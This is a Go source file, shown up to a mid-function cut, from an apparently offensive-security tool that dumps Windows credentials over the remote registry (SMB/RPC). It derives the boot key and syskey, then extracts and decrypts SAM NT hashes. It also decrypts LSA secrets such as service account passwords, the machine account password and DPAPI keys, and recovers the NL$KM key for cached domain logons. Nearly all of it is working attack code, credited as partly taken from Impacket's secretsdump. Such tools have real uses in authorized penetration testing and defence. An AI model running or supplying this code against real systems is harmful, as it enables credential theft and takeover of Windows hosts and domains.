// MIT License
//
// # Copyright (c) 2023 Jimmy Fjällid
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.
package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/md5"
	"crypto/rc4"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"strconv"
	"strings"

	"github.com/jfjallid/go-smb/smb/dcerpc/msrrp"
	"github.com/jfjallid/go-smb/smb/encoder"
	"golang.org/x/crypto/md4"
)

var (
	s1         = []byte("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\x00")
	s2         = []byte("0123456789012345678901234567890123456789\x00")
	s3         = []byte("NTPASSWORD\x00")
	BootKey    []byte
	LSAKey     []byte
	NLKMKey    []byte
	VistaStyle bool
)

type UserCreds struct {
	Username string
	Data     []byte
	IV       []byte
	RID      uint32
	AES      bool
}

type printableSecret struct {
	secretType  string
	secrets     []string
	extraSecret string
}

// https://www.passcape.com/index.php?section=docsys&cmd=details&id=23
type lsa_secret struct {
	Version       uint32
	EncKeyId      string // 16 bytes
	EncAlgorithm  uint32
	Flags         uint32
	EncryptedData []byte
}

func (self *lsa_secret) unmarshal(data []byte) {
	self.Version = binary.LittleEndian.Uint32(data[:4])
	self.EncKeyId = string(data[4:20])
	self.EncAlgorithm = binary.LittleEndian.Uint32(data[20:24])
	self.Flags = binary.LittleEndian.Uint32(data[24:28])
	self.EncryptedData = data[28:]
}

type lsa_secret_blob struct {
	Length  uint32
	Unknown [12]byte
	Secret  []byte
}

func (self *lsa_secret_blob) unmarshal(data []byte) {
	self.Length = binary.LittleEndian.Uint32(data[:4])
	copy(self.Unknown[:], data[4:16])
	self.Secret = data[16 : 16+self.Length]
}

type dpapi_system struct {
	Version    uint32
	MachineKey [20]byte
	UserKey    [20]byte
}

func (self *dpapi_system) unmarshal(data []byte) {
	self.Version = binary.LittleEndian.Uint32(data[:4])
	copy(self.MachineKey[:], data[4:24])
	copy(self.UserKey[:], data[24:44])
}

type nl_record struct {
	UserLength               uint16
	DomainNameLength         uint16
	EffectiveNameLength      uint16
	FullNameLength           uint16
	LogonScriptName          uint16
	ProfilePathLength        uint16
	HomeDirectoryLength      uint16
	HomeDirectoryDriveLength uint16
	UserId                   uint32
	PrimaryGroupId           uint32
	GroupCount               uint32
	logonDomainNameLength    uint16
	Unk0                     uint16
	LastWrite                uint64
	Revision                 uint32
	SidCount                 uint32
	Flags                    uint32
	Unk1                     uint32
	LogonPackageLength       uint32
	DnsDomainNameLength      uint16
	UPN                      uint16
	IV                       [16]byte
	CH                       [16]byte
	EncryptedData            []byte
}

func (self *nl_record) unmarshal(data []byte) (err error) {
	if len(data) < 96 {
		err = fmt.Errorf("Not enough data to unmarshal an NL_RECORD")
		log.Errorln(err)
		return
	}

	self.UserLength = binary.LittleEndian.Uint16(data[:2])
	self.DomainNameLength = binary.LittleEndian.Uint16(data[2:4])
	self.EffectiveNameLength = binary.LittleEndian.Uint16(data[4:6])
	self.FullNameLength = binary.LittleEndian.Uint16(data[6:8])
	self.LogonScriptName = binary.LittleEndian.Uint16(data[8:10])
	self.ProfilePathLength = binary.LittleEndian.Uint16(data[10:12])
	self.HomeDirectoryLength = binary.LittleEndian.Uint16(data[12:14])
	self.HomeDirectoryDriveLength = binary.LittleEndian.Uint16(data[14:16])
	self.UserId = binary.LittleEndian.Uint32(data[16:20])
	self.PrimaryGroupId = binary.LittleEndian.Uint32(data[20:24])
	self.GroupCount = binary.LittleEndian.Uint32(data[24:28])
	self.logonDomainNameLength = binary.LittleEndian.Uint16(data[28:30])
	self.Unk0 = binary.LittleEndian.Uint16(data[30:32])
	self.LastWrite = binary.LittleEndian.Uint64(data[32:40])
	self.Revision = binary.LittleEndian.Uint32(data[40:44])
	self.SidCount = binary.LittleEndian.Uint32(data[44:48])
	self.Flags = binary.LittleEndian.Uint32(data[48:52])
	self.Unk1 = binary.LittleEndian.Uint32(data[52:56])
	self.LogonPackageLength = binary.LittleEndian.Uint32(data[56:60])
	self.DnsDomainNameLength = binary.LittleEndian.Uint16(data[60:62])
	self.UPN = binary.LittleEndian.Uint16(data[62:64])
	copy(self.IV[:], data[64:80])
	copy(self.CH[:], data[80:96])
	self.EncryptedData = data[96:]
	return
}

func pad64(data uint64) uint64 {
	if (data & 0x3) > 0 {
		return data + (data & 0x3)
	}
	return data
}

func getServiceUser(rpccon *msrrp.RPCCon, base []byte, name string) (result string, err error) {
	hSubKey, err := rpccon.OpenSubKey(base, `SYSTEM\CurrentControlSet\Services\`+name)
	if err != nil {
		log.Errorln(err)
		return
	}
	defer rpccon.CloseKeyHandle(hSubKey)
	return rpccon.QueryValueString(hSubKey, "ObjectName")
}

func parseSecret(rpccon *msrrp.RPCCon, base []byte, name string, secretItem []byte) (result *printableSecret, err error) {

	if len(secretItem) == 0 {
		log.Debugf("Discarding secret %s, NULL Data\n", name)
		return
	}
	if bytes.Compare(secretItem[:2], []byte{0, 0}) == 0 {
		log.Debugf("Discarding secret %s, all zeros\n", name)
		return
	}
	secret := ""
	extrasecret := ""
	upperName := strings.ToUpper(name)
	result = &printableSecret{}
	result.secretType = "[*] " + name
	if strings.HasPrefix(upperName, "_SC_") {
		secretDecoded, err2 := encoder.FromUnicodeString(secretItem)
		if err2 != nil {
			err = err2
			log.Errorln(err)
			return
		}
		//Get service account name
		svcUser, err := getServiceUser(rpccon, base, name[4:]) // Skip initial _SC_ of the name
		if err != nil {
			log.Errorln(err)
			svcUser = "(unknown user)"
		} else {
			if strings.HasPrefix(svcUser, ".\\") {
				svcUser = svcUser[2:]
			}
		}
		secret = fmt.Sprintf("%s: %s", svcUser, secretDecoded)
		result.secrets = append(result.secrets, secret)
		//} else if strings.HasPrefix(upperName, "DEFAULTPASSWORD") {
		//    secretDecoded, err2 := encoder.FromUnicodeString(secretItem)
		//    if err2 != nil {
		//        err = err2
		//        log.Errorln(err)
		//        return
		//    }
		//    username, err := getDefaultLogonName()
		//    if err != nil {
		//        golog.Errorln(err)
		//    }
		//    if username == "" {
		//        username = "(Unknown user)"
		//    }

		//    // Get default login name
		//    secret = fmt.Sprintf("%s: %s", username, secretDecoded)
		//    result.secrets = append(result.secrets, secret)
	} else if strings.HasPrefix(upperName, "ASPNET_WP_PASSWORD") {
		secretDecoded, err2 := encoder.FromUnicodeString(secretItem)
		if err2 != nil {
			err = err2
			log.Errorln(err)
			return
		}
		secret = fmt.Sprintf("ASPNET: %s", secretDecoded)
		result.secrets = append(result.secrets, secret)
	} else if strings.HasPrefix(upperName, "DPAPI_SYSTEM") {
		dpapi := &dpapi_system{}
		dpapi.unmarshal(secretItem)
		secret = fmt.Sprintf("dpapi_machinekey: 0x%x", dpapi.MachineKey)
		secret2 := fmt.Sprintf("dpapi_userkey: 0x%x", dpapi.UserKey)
		result.secrets = append(result.secrets, secret)
		result.secrets = append(result.secrets, secret2)
		//log.Noticeln("DPAPI_SYSTEM secret")
	} else if strings.HasPrefix(upperName, "$MACHINE.ACC") {
		//log.Noticeln("Machine Account secret")
		h := md4.New()
		h.Write(secretItem)
		printname := "$MACHINE.ACC"
		secret = fmt.Sprintf("$MACHINE.ACC: %s", h.Sum(nil))
		result.secrets = append(result.secrets, secret)
		// Always print plaintext anyway since this may be needed for some popular usecases
		extrasecret = fmt.Sprintf("%s:plain_password_hex:%x", printname, secretItem)
		result.extraSecret = extrasecret
	} else if strings.HasPrefix(upperName, "NL$KM") {
		secret = fmt.Sprintf("NL$KM: 0x%x", secretItem[:16])
		result.secrets = append(result.secrets, secret)
	} else if strings.HasPrefix(upperName, "CACHEDDEFAULTPASSWORD") {
		//TODO What is CachedDefaultPassword? How is it different from the registry keys under winlogon?
		// Default password for winlogon
		secretDecoded, err2 := encoder.FromUnicodeString(secretItem)
		if err2 != nil {
			err = err2
			log.Errorln(err)
			return
		}
		log.Noticeln("Check for default username is not implemented yet")
		//username, err := getDefaultLogonName()
		//if err != nil {
		//    log.Errorln(err)
		//}
		username := ""
		if username == "" {
			username = "(Unknown user)"
		}

		// Get default login name
		secret = fmt.Sprintf("%s: %s", username, secretDecoded)
		result.secrets = append(result.secrets, secret)
	} else {
		// Handle Security questions?
		log.Noticef("Empty or unhandled secret for %s: %x\n", name, secretItem)
	}
	return
}

func getBootKey(rpccon *msrrp.RPCCon, base []byte) (result []byte, err error) {
	// check if bootkey is already retrieved
	if len(BootKey) != 0 {
		return BootKey, nil
	}
	log.Debugln("Retrieving bootkey from registry")

	result = make([]byte, 16)
	var p []byte = []byte{0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7}
	scrambledKey := make([]byte, 0, 16)

	hSubKey, err := rpccon.OpenSubKey(base, `SYSTEM\CurrentControlSet\Control\Lsa\JD`)
	if err != nil {
		log.Errorln(err)
		return
	}
	keyinfo, err := rpccon.QueryKeyInfo(hSubKey)
	if err != nil {
		log.Errorln(err)
		rpccon.CloseKeyHandle(hSubKey)
		return
	}
	rpccon.CloseKeyHandle(hSubKey)
	hexString, err := encoder.FromUnicodeString(encoder.Utf16ToUtf8(keyinfo.ClassName))
	if err != nil {
		log.Errorln(err)
		return
	}
	jd, err := hex.DecodeString(hexString)
	if err != nil {
		log.Errorln(err)
		return
	}

	log.Debugf("KeyClass: %x\n", jd)
	scrambledKey = append(scrambledKey, jd...)

	hSubKey, err = rpccon.OpenSubKey(base, `SYSTEM\CurrentControlSet\Control\Lsa\Skew1`)
	if err != nil {
		log.Errorln(err)
		return
	}
	keyinfo, err = rpccon.QueryKeyInfo(hSubKey)
	if err != nil {
		log.Errorln(err)
		rpccon.CloseKeyHandle(hSubKey)
		return
	}
	rpccon.CloseKeyHandle(hSubKey)
	hexString, err = encoder.FromUnicodeString(encoder.Utf16ToUtf8(keyinfo.ClassName))
	if err != nil {
		log.Errorln(err)
		return
	}
	skew1, err := hex.DecodeString(hexString)
	if err != nil {
		log.Errorln(err)
		return
	}

	log.Debugf("KeyClass: %x\n", skew1)
	scrambledKey = append(scrambledKey, skew1...)

	hSubKey, err = rpccon.OpenSubKey(base, `SYSTEM\CurrentControlSet\Control\Lsa\GBG`)
	if err != nil {
		log.Errorln(err)
		return
	}
	keyinfo, err = rpccon.QueryKeyInfo(hSubKey)
	if err != nil {
		log.Errorln(err)
		rpccon.CloseKeyHandle(hSubKey)
		return
	}
	rpccon.CloseKeyHandle(hSubKey)
	hexString, err = encoder.FromUnicodeString(encoder.Utf16ToUtf8(keyinfo.ClassName))
	if err != nil {
		log.Errorln(err)
		return
	}
	gbg, err := hex.DecodeString(hexString)
	if err != nil {
		log.Errorln(err)
		return
	}

	log.Debugf("KeyClass: %x\n", gbg)
	scrambledKey = append(scrambledKey, gbg...)

	hSubKey, err = rpccon.OpenSubKey(base, `SYSTEM\CurrentControlSet\Control\Lsa\Data`)
	if err != nil {
		log.Errorln(err)
		return
	}
	keyinfo, err = rpccon.QueryKeyInfo(hSubKey)
	if err != nil {
		log.Errorln(err)
		rpccon.CloseKeyHandle(hSubKey)
		return
	}
	rpccon.CloseKeyHandle(hSubKey)
	hexString, err = encoder.FromUnicodeString(encoder.Utf16ToUtf8(keyinfo.ClassName))
	if err != nil {
		log.Errorln(err)
		return
	}
	data, err := hex.DecodeString(hexString)
	if err != nil {
		log.Errorln(err)
		return
	}

	log.Debugf("KeyClass: %x\n", data)
	scrambledKey = append(scrambledKey, data...)

	log.Debugf("ScrambledKey: %x\n", scrambledKey)
	for i := 0; i < len(scrambledKey); i++ {
		result[i] = scrambledKey[p[i]]
	}
	BootKey = make([]byte, 16)
	copy(BootKey, result)
	log.Noticef("BootKey: 0x%x\n", BootKey)

	return
}

func getEncryptedsysKey(rpccon *msrrp.RPCCon, base, f []byte) (encsysKey []byte, err error) {

	val, err := IsWin10After1607(GetOSVersionBuild(rpccon, base))
	if err != nil {
		return
	}
	if val {
		log.Debugf("Getting AES encrypted sysKey from F[0x88]\n")
		encsysKey = f[0x88 : 0x88+16]
	} else {
		encsysKey = f[0x80 : 0x80+16]
	}
	return
}

func getEncryptedsysKeyIV(rpccon *msrrp.RPCCon, base, f []byte) (sysKeyIV []byte, err error) {
	val, err := IsWin10After1607(GetOSVersionBuild(rpccon, base))
	if err != nil {
		return
	}
	if val {
		log.Debugf("Getting sysKey IV from F[0x78]\n")
		sysKeyIV = f[0x78 : 0x78+16]
	} else {
		sysKeyIV = f[0x70 : 0x70+16]
	}
	return
}

func getSysKey(rpccon *msrrp.RPCCon, base []byte) (sysKey []byte, err error) {
	var tmpSysKey []byte
	_, err = getBootKey(rpccon, base)
	if err != nil {
		return
	}
	hSubKey, err := rpccon.OpenSubKey(base, `SAM\SAM\Domains\Account`)
	if err != nil {
		log.Errorln(err)
		return
	}

	f, err := rpccon.QueryValue(hSubKey, "F")
	if err != nil {
		log.Errorln(err)
		rpccon.CloseKeyHandle(hSubKey)
		return
	}

	rpccon.CloseKeyHandle(hSubKey)

	encsysKey, err := getEncryptedsysKey(rpccon, base, f)
	if err != nil {
		return
	}
	sysKeyIV, err := getEncryptedsysKeyIV(rpccon, base, f)
	if err != nil {
		return
	}

	if f[0] == 0x3 {
		tmpSysKey, err = DecryptAESSysKey(BootKey, encsysKey, sysKeyIV)
	} else {
		tmpSysKey, err = DecryptRC4SysKey(BootKey, encsysKey, sysKeyIV)
	}
	if err != nil {
		log.Errorln(err)
		return
	}
	sysKey = make([]byte, len(tmpSysKey))
	copy(sysKey, tmpSysKey)
	log.Noticef("SysKey: 0x%x\n", sysKey)
	return
}

func DecryptRC4SysKey(bootkey, encSyskey, syskeyIV []byte) (syskey []byte, err error) {
	// Building the decryption key for the Syskey
	input := []byte{}
	input = append(input, syskeyIV...)
	input = append(input, s1...)
	input = append(input, bootkey...)
	input = append(input, s2...)
	// Building syskey RC4 enc key with: one byte from F[0x70], String1, Bootkey, String2
	rc4key := md5.Sum(input)
	log.Debugf("Syskey RC4 enc key: md5(%x %x %x %x)\n", syskeyIV, s1, bootkey, s2)
	log.Debugf("Syskey RC4 enc key: %x\n", rc4key)
	c1, err := rc4.NewCipher(rc4key[:])
	if err != nil {
		log.Errorln("Failed to init RC4 key")
		return
	}
	syskey = make([]byte, 16)
	c1.XORKeyStream(syskey, encSyskey)
	log.Debugf("Syskey: %x\n", syskey)
	return
}

func DecryptAESSysKey(bootkey, encSyskey, syskeyIV []byte) (syskey []byte, err error) {
	syskey = make([]byte, 16)
	a1, err := aes.NewCipher(bootkey)
	if err != nil {
		log.Errorln("Failed to init AES key")
		return
	}
	c1 := cipher.NewCBCDecrypter(a1, syskeyIV)
	c1.CryptBlocks(syskey, encSyskey)
	return
}

func getNTHash(rpccon *msrrp.RPCCon, base []byte, rids []string) (result []UserCreds, err error) {
	result = make([]UserCreds, len(rids))
	log.Debugf("Number users: %d\n", len(rids))
	// Some entires have empty passwords or hash retrieval fails for some reason.
	// In those cases I skip to the next entry. I increment the ctr first thing
	// instead of at the end of the loop to make sure it happens
	cntr := -1
	for _, ridStr := range rids {
		cntr += 1
		log.Debugf("Incrementing cntr to: %d\n", cntr)
		parts := strings.Split(ridStr, "\\")
		ridBytes, err := hex.DecodeString(parts[len(parts)-1])
		if err != nil {
			log.Errorln(err)
			return nil, err
		}
		rid := binary.BigEndian.Uint32(ridBytes)
		result[cntr].RID = rid

		hSubKey, err := rpccon.OpenSubKey(base, ridStr)
		if err != nil {
			log.Errorln(err)
			return nil, err
		}

		v, err := rpccon.QueryValue(hSubKey, "V")
		if err != nil {
			log.Errorln(err)
			rpccon.CloseKeyHandle(hSubKey)
			return nil, err
		}
		rpccon.CloseKeyHandle(hSubKey)
		/*
		   Information about the structure of the V value of
		   SAM\SAM\Domain\Users\<sid> is collected from multiple locations but most
		   of the information is taken from http://www.beginningtoseethelight.org/ntsecurity/index.htm
		   Some info is also taken from https://social.technet.microsoft.com/Forums/en-US/6e3c4486-f3a1-4d4e-9f5c-bdacdb245cfd/how-are-ntlm-hashes-stored-under-the-v-key-in-the-sam?forum=win10itprogeneral

		   The first 12 bytes are unknown. Next comes 12-byte blocks of 3 uint32
		   where the first contain the relative offset, the second contains the
		   length and the third is unknown.
		   The relative offset is relative to 0xcc, so if the offset for the username
		   would be 0xc0 the offset from beginning of V would be 0xcc+0xc0

		   Some of the offsets for the 12-byte blocks:
		   Address 	Information
		   0x0c 	    Offset of the account name
		   0x10 	    Length of the account name
		   0x18 	    Offset of the complete account name
		   0x1c 	    Length of the complete account name
		   0x24 	    Offset of the comment
		   0x28 	    Length of the comment
		   0x48 	    Offset of the homedir name
		   0x4c 	    Length of the homedir name
		   0x60 	    Offset of the scriptpath
		   0x9c 	    Offset of the LM Hash
		   0xa0 	    Length of the LM Hash
		   0xa8 	    Offset of the NT Hash
		   0xac 	    Length of the NT Hash
		   0xc4 	    Number of hashes from history

		   Get NTHash length:
		   int(V[0xac] + V[0xad]*0x100)
		   Get NTHash addr:
		   int(V[0xa8] + V[0xa9]*0x100 + 0xcc)

		   Info from Impacket's secretsdump.py (SAM_HASH_AES structure)
		   For AES hashes, the NTHashAddr value will point to the beginning of a structure:
		   PekID: 2 bytes
		   Revision: 2 bytes
		   DataOffset: 4 bytes
		   Salt: 16 bytes
		   Hash: 32 bytes

		   So, add 8 bytes, read 16 byte salt, and then read additional 16 bytes
		   hash. There are 32 bytes there but only first 16 bytes seems to be used
		   in decryption.

		   Info from Impacket's secretsdump.py (SAM_HASH structure)
		   For RC4 hashes, the NTHashAddr value will point to the beginning of a structure:
		   PekID: 2 bytes
		   Revision: 2 bytes
		   Hash: 16 bytes

		   So, add 4 bytes to the offset and then read the 16 byte hash.

		   There has been some changes in the NT Hashes between windows versions.
		   Originally it was RC4 hashes but some time after Windows 10 it was changed
		   to AES hashes. For new installations of Windows 10 after some patch
		   (Win10 Anniversary update) it was only AES hashes, but if the system
		   was upgraded the old hashes would be RC4 and new accounts would get AES
		   hashes. So to figure out if it is RC4 or AES we check version of
		   Windows and the length of the hash structure.
		*/

		offsetName := binary.LittleEndian.Uint32(v[0x0c:]) + 0xcc
		szName := binary.LittleEndian.Uint32(v[0x10:])
		result[cntr].Username, err = encoder.FromUnicodeString(v[offsetName : offsetName+szName])
		if err != nil {
			log.Errorln(err)
			continue
		}

		szNT := binary.LittleEndian.Uint32(v[0xac:])
		offsetHashStruct := binary.LittleEndian.Uint32(v[0xa8:]) + 0xcc
		//log.Debugf("Size of SAM Hash structure for user %s: %d located at offset: 0x%x\n", name, szNT, offsetHashStruct)
		preWin11, err2 := IsBetweenWinXPWin10(GetOSVersionBuild(rpccon, base))
		if err2 != nil {
			log.Errorln(err2)
			continue
		}
		if preWin11 && (0x14 == szNT) {
			// PreWin10Anniversary update (RC4)
			szNT -= 4                            // Hash length is reported as 20 bytes. 2+2+16 bytes for all members of the structure
			offsetNTHash := offsetHashStruct + 4 // Skipping first 4 bytes of structure
			result[cntr].AES = false
			result[cntr].Data = v[offsetNTHash : offsetNTHash+16]
		} else {
			afterAnniversary, err2 := IsWin10After1607(GetOSVersionBuild(rpccon, base))
			if err2 != nil {
				log.Errorln(err2)
				continue
			}
			if afterAnniversary {
				if 0x38 == szNT {
					// AES Structure is 2+2+4+16+32 = 56 or 0x38 bytes for all members of the structure
					offsetIV := offsetHashStruct + 8      // Skipping first 8 bytes of AES Hash structure
					offsetNTHash := offsetHashStruct + 24 // The aes encrypted NT Hash begins after the 16 byte IV (8 + 16)
					result[cntr].AES = true
					result[cntr].Data = v[offsetNTHash : offsetNTHash+16]
					result[cntr].IV = v[offsetIV : offsetIV+16]
				} else if szNT == 0x18 { // Structure with empty hashes (2+2+4+16)
					result[cntr].AES = true
					result[cntr].Data = []byte{}
				} else {
					//log.Warningf("NT Hash length for %s is 0x%x when after win10 Anniversary update is: %v which is unexpected\n", name, szNT, afterAnniversary)
					log.Warningf("NT Hash length for %x is 0x%x when after win10 Anniversary update is: %v which is unexpected\n", rid, szNT, afterAnniversary)
				}
			} else {
				if szNT == 0x4 { // Structure with empty hash for RC4
					result[cntr].AES = false
					result[cntr].Data = []byte{}
				} else {
					log.Warningf("Unknown Hash type for %x with length 0x%x with OS: %s\n", rid, szNT, GetOsVersionName(GetOSVersionBuild(rpccon, base)))
				}
			}
		}
	}
	return
}

func decryptLSAKey(rpccon *msrrp.RPCCon, base []byte, data []byte) (result []byte, err error) {
	_, err = getBootKey(rpccon, base)
	if err != nil {
		log.Errorln(err)
		return
	}
	var plaintext []byte
	if VistaStyle {
		// data contains a list of LSA Keys, so could be more than 1 in the list.
		lsaSecret := &lsa_secret{}
		lsaSecret.unmarshal(data)
		log.Debugf("LSA EncKeyId: %x, EncAlgorithm: %d\n", lsaSecret.EncKeyId, lsaSecret.EncAlgorithm)
		encryptedData := lsaSecret.EncryptedData
		tmpkey := SHA256(BootKey, encryptedData[:32], 0)
		plaintext, err2 := DecryptAES(tmpkey, encryptedData[32:], nil)
		if err2 != nil {
			log.Errorln(err2)
			err = err2
			return
		}
		lsaSecretBlob := &lsa_secret_blob{}
		lsaSecretBlob.unmarshal(plaintext)
		result = lsaSecretBlob.Secret[52:][:32]
	} else {
		// Seems to be for Windows XP
		// Untested code
		h := md5.New()
		h.Write(BootKey)
		for i := 0; i < 1000; i++ {
			h.Write(data[60:76])
		}
		tmpkey := h.Sum(nil)
		c1, err2 := rc4.NewCipher(tmpkey[:])
		if err2 != nil {
			err = err2
			log.Errorln("Failed to init RC4 key")
			return
		}
		plaintext = make([]byte, 48)
		c1.XORKeyStream(plaintext, data[12:60])
		result = plaintext[0x10:0x20]
	}
	return
}

func getLSASecretKey(rpccon *msrrp.RPCCon, base []byte) (result []byte, err error) {
	if len(LSAKey) > 0 {
		return
	}
	/*
	   Information from
	   https://www.passcape.com/index.php?section=docsys&cmd=details&id=23
	   Before Windows Vista, there was only a single encryption key for LSA
	   secrets that was stored in the registry entry
	   Security\Policy\PolSecretEncryptionKey

	   However, after Vista there was a change that allowed for multiple encryption
	   keys such that LSA secrets could be encrypted with different keys.
	   These encryption keys are stored in a list in the registry entry
	   Security\Policy\PolEKList

	   TODO Implement support for multiple LSA encryption keys
	   For now this implementation only supports using a single encryption key.
	   To know which key to use a check is performed to see what registry value
	   is populated with a key.
	*/
	VistaStyle = true
	var data []byte
	log.Debugln("Decrypting LSA Key")

	hSubKey, err := rpccon.OpenSubKey(base, `Security\Policy\PolEKList`)
	if err != nil {
		if err == fmt.Errorf("ERROR_FILE_NOT_FOUND") {
			VistaStyle = false
		} else {
			log.Errorln(err)
			return
		}
	}
	data, err = rpccon.QueryValue(hSubKey, "")
	if err != nil {
		log.Errorln(err)
		rpccon.CloseKeyHandle(hSubKey)
		return
	}
	rpccon.CloseKeyHandle(hSubKey)

	if !VistaStyle {
		hSubKey, err = rpccon.OpenSubKey(base, `Security\Policy\PolSecretEncryptionKey`)
		if err != nil {
			if err == fmt.Errorf("ERROR_FILE_NOT_FOUND") {
				log.Infoln("Could not find LSA Secret key")
			} else {
				log.Errorln(err)
			}
			return
		}
		data, err = rpccon.QueryValue(hSubKey, "")
		if err != nil {
			log.Errorln(err)
			rpccon.CloseKeyHandle(hSubKey)
			return
		}
		rpccon.CloseKeyHandle(hSubKey)
	}
	if len(data) == 0 {
		err = fmt.Errorf("Failed to get LSA key")
		log.Errorln(err)
		return
	}

	result, err = decryptLSAKey(rpccon, base, data)
	if err != nil {
		log.Errorln(err)
		return
	}
	LSAKey = make([]byte, 32)
	copy(LSAKey, result)
	return
}

// Code inspired/partially stolen from Impacket's Secretsdump
func GetLSASecrets(rpccon *msrrp.RPCCon, base []byte, history bool) (secrets []printableSecret, err error) {
	secretsPath := `SECURITY\Policy\Secrets`
	keys, err := rpccon.GetSubKeyNames(base, secretsPath)
	if err != nil {
		log.Errorln(err)
		return nil, err
	}

	if len(keys) == 0 {
		return
	}

	// GetLSASecretKey
	log.Debugln("Getting LSASecretKey")
	_, err = getLSASecretKey(rpccon, base)
	if err != nil {
		log.Errorln(err)
		return
	}
	log.Debugf("LSA Secret key: %x\n", LSAKey)

	for _, key := range keys {
		if key == "NL$Control" { // Skip
			continue
		}
		log.Debugf("Looking into %s", key)
		/* The SECURITY\Policy\Secrets each contain a set of values where two
		   of them are OldVal and CurrVal. OldVal seems to be the previously
		   stored secret before it was updated. So it can be included if a history
		   is desired. Otherwise CurrVal contains the current value of the secret.*/
		valueTypeList := []string{"CurrVal"}
		if history {
			valueTypeList = append(valueTypeList, "OldVal")
		}
		var secret []byte
		for _, valueType := range valueTypeList {
			log.Debugf("Retrieving value: %s\\%s\\%s\n", secretsPath, key, valueType)
			hSubKey, err := rpccon.OpenSubKey(base, fmt.Sprintf("%s\\%s\\%s", secretsPath, key, valueType))
			if err != nil {
				log.Errorln(err)
				return nil, err
			}

			value, err := rpccon.QueryValue(hSubKey, "")
			if err != nil {
				log.Errorln(err)
				rpccon.CloseKeyHandle(hSubKey)
				continue
			}
			rpccon.CloseKeyHandle(hSubKey)

			if (len(value) != 0) && (value[0] == 0x0) {
				if VistaStyle {
					record := &lsa_secret{}
					record.unmarshal(value)
					tmpKey := SHA256(LSAKey, record.EncryptedData[:32], 0)
					plainText, err := DecryptAES(tmpKey, record.EncryptedData[32:], nil)
					if err != nil {
						log.Errorln(err)
						continue
					}
					record2 := &lsa_secret_blob{}
					record2.unmarshal(plainText)
					secret = record2.Secret
				} else {
					log.Warningln("Windows XP secrets are not supported")
					continue
					//TODO
				}
				if valueType == "OldVal" {
					key += "_history"
				}
				ps, err := parseSecret(rpccon, base, key, secret)
				if err != nil {
					log.Errorln(err)
					continue
				} else if ps == nil {
					continue
				}
				secrets = append(secrets, *ps)
			}
		}
	}
	return
}

func getNLKMSecretKey(rpccon *msrrp.RPCCon, base []byte) (result []byte, err error) {
	if len(NLKMKey) > 0 {
		return
	}

	log.Debugln("Decrypting NL$KM")
	hSubKey, err := rpccon.OpenSubKey(base, `SECURITY\Policy\Secrets\NL$KM\CurrVal`)
	if err != nil {
		log.Errorln(err)
		return
	}
	data, err := rpccon.QueryValue(hSubKey, "")
	if err != nil {
		log.Errorln(err)
		rpccon.CloseKeyHandle(hSubKey)
		return
	}
	rpccon.CloseKeyHandle(hSubKey)

	if VistaStyle {
		lsaSecret := &lsa_secret{}
		lsaSecret.unmarshal(data)
		tmpkey := SHA256(LSAKey, lsaSecret.EncryptedData[:32], 0)
		var err2 error
		result, err2 = DecryptAES(tmpkey, lsaSecret.EncryptedData[32:], nil)
		if err2 != nil {
			log.Errorln(err2)
			err = err2
			return
		}
	} else {
		log.Errorln("Not yet implement how to decrypt NL$KM key when not VistaStyle")
		return
	}

	NLKMKey = make([]byte, 32)
	copy(NLKMKey, result)

	return
}

func GetCachedHashes(rpccon *msrrp.RPCCon, base []byte) (result []string, err error) {
	baseKeyPath := `Security\Cache`
	var names []string
	hSubKey, err := rpccon.OpenSubKey(base, baseKeyPath)
	if err != nil {
		log.Errorln(err)
		return
	}
	defer rpccon.CloseKeyHandle(hSubKey)

	valueNames, err := rpccon.GetValueNames(hSubKey)
	if err != nil {
		log.Errorln(err)
		return
	}

	if len(valueNames) == 0 {
		// No cache entries
		return
	}
	foundIterCount := false
	for _, name := range valueNames {
		if name == "NL$Control" {
			continue
		}
		if name == "NL$IterationCount" {
			foundIterCount = true
			continue
		}
		names = append(names, name)
	}
	iterationCount := 10240
	if foundIterCount {
		var tmpIterCount uint32
		data, err := rpccon.QueryValue(hSubKey, `NL$IterationCount`)
		if err != nil {
			log.Errorln(err)
			return nil, err
		}
		tmpIterCount = binary.LittleEndian.Uint32(data)
		if tmpIterCount > 10240 {
			iterationCount = int(tmpIterCount & 0xfffffc00)
		} else {
			iterationCount = int(tmpIterCount * 1024)
		}
	}

	_, err = getLSASecretKey(rpccon, base)
	if err != nil {
		log.Errorln(err)
		return
	}
	_, err = getNLKMSecretKey(rpccon, base)
	if err != nil {
		log.Errorln(err)
		return
	}
	for _, name := range names {
		log.Debugf("Looking into %s\n", name)
		data, err := rpccon.QueryValue(hSubKey, name)
		if err != nil {
			log.Errorln(err)
			return nil, err
		}

		// NL_RECORD
		nl_record := &nl_record{}
		err = nl_record.unmarshal(data)
		if err != nil {
			log.Errorln(err)
			continue
		}
		nilIV := make([]byte, 16)
		var plaintext []byte
		var answer string
		if bytes.Compare(nl_record.IV[:], nilIV) != 0 {
			if (nl_record.Flags & 1) == 1 {
				// Encrypted
				if VistaStyle {
					plaintext, err = DecryptAES(NLKMKey[16:32], nl_record.EncryptedData, nl_record.IV[:])
					if err != nil {
						log.Errorln(err)
						continue
					}
				} else {
					log.Errorln("Not yet implement how to decrypt DCC2Cache when not VistaStyle")
					continue
				}
			} else {
				log.Noticef("Not sure how to handle non-encrypted record: %s\n", name)
				continue
			}
			encHash := plaintext[:0x10]
